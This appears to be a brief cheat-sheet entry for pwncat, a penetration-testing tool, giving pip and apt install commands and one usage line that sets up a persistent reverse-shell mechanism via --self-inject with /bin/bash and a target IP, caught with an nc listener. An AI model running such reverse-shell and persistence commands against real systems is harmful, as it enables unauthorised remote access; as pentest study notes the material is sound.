# Pwncat

## Installation

#### 1) Pip

    pip install pwncat

#### 2) Apt

    sudo apt install pwncat

## Usage:

#### 1) Sets up a listener while creating a persistent mechanism. Connect back with rlwrap nc -lvnp PORT. +NUM indicates how many more ports does the persistent mechanism work

    pwncat -l PORT --self-inject /bin/bash:TARGET_IP:PORT+NUM 

